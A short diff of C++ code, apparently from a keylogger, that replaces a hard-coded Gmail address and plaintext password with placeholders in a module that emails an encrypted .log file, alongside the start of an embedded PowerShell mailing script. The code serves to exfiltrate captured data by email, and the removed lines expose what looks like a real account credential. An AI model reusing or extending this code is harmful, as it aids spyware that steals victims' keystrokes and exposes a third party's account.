@@ -14,9 +14,9 @@
 //by attaching the encrypted .log file to the email
 namespace Mail
 {
-    #define X_EM_TO "managejobs9@gmail.com"
-    #define X_EM_FROM "managejobs9@gmail.com"
-    #define X_EM_PASS "1234abcd@"
+    #define X_EM_TO "RECEIVER_EMAIL"
+    #define X_EM_FROM "SENDER_EMAIL"
+    #define X_EM_PASS "PASSWORD"
 
 const std::string &PowerShellScript =
 "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
